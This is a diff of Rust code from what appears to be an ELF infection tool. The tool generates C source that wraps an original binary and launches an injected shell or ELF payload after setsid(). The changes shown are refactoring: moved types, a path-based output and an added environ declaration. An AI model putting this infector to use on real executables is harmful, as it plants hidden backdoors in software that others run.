@@ -1,35 +1,7 @@
-use crate::args;
 use crate::codegen::c;
 use crate::errors::*;
-use serde::{Deserialize, Serialize};
-use tokio::fs::File;
-use tokio::io::AsyncWrite;
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub enum Payload<'a> {
-    Shell(&'a str),
-    Elf(&'a [u8]),
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Infect {
-    pub payload: Option<String>,
-    #[serde(default)]
-    pub self_replace: bool,
-    pub assume_path: Option<String>,
-}
-
-impl TryFrom<args::InfectElf> for Infect {
-    type Error = Error;
-
-    fn try_from(args: args::InfectElf) -> Result<Self> {
-        Ok(Infect {
-            payload: args.payload,
-            self_replace: args.self_replace,
-            assume_path: args.assume_path,
-        })
-    }
-}
+use crate::infect::elf::{Infect, Payload};
+use std::path::Path;
 
 pub async fn add_payload(compiler: &mut c::Compiler, payload: &Payload<'_>) -> Result<()> {
     compiler.add_lines(&["setsid();\n"]).await?;
@@ -61,25 +33,13 @@ pub async fn add_payload(compiler: &mut c::Compiler, payload: &Payload<'_>) -> R
     Ok(())
 }
 
-pub async fn infect<W: AsyncWrite + Unpin>(
+pub async fn infect(
+    bin: &Path,
     config: &Infect,
     orig: &[u8],
-    elf_payload: Option<&[u8]>,
-    out: &mut W,
+    payload: Option<&Payload<'_>>,
 ) -> Result<()> {
-    let dir = tempfile::tempdir()?;
-    let bin = dir.path().join("bin");
-
-    let mut compiler = c::Compiler::spawn(&bin).await?;
-
-    let payload = if let Some(elf) = elf_payload {
-        Some(Payload::Elf(elf))
-    } else {
-        config
-            .payload
-            .as_ref()
-            .map(|payload| Payload::Shell(payload))
-    };
+    let mut compiler = c::Compiler::spawn(bin).await?;
 
     info!("Generating source code...");
     compiler
@@ -91,6 +51,7 @@ pub async fn infect<W: AsyncWrite + Unpin>(
             "#include <fcntl.h>\n",
             "#include <sys/mman.h>\n",
             "#include <linux/limits.h>\n",
+            "extern char **environ;\n",
             "int main(int argc, char** argv) {\n",
             "int f;\n",
         ])
@@ -149,14 +110,6 @@ pub async fn infect<W: AsyncWrite + Unpin>(
     let mut pending = compiler.done();
     info!("Waiting for compile to finish...");
     pending.wait().await?;
-
-    debug!("Copying compiled binary to final destination");
-    let mut f = File::open(&bin)
-        .await
-        .with_context(|| anyhow!("Failed to open compiled binary at {:?}", bin))?;
-    tokio::io::copy(&mut f, out).await?;
-
-    info!("Successfully generated binary");
 
     Ok(())
 }
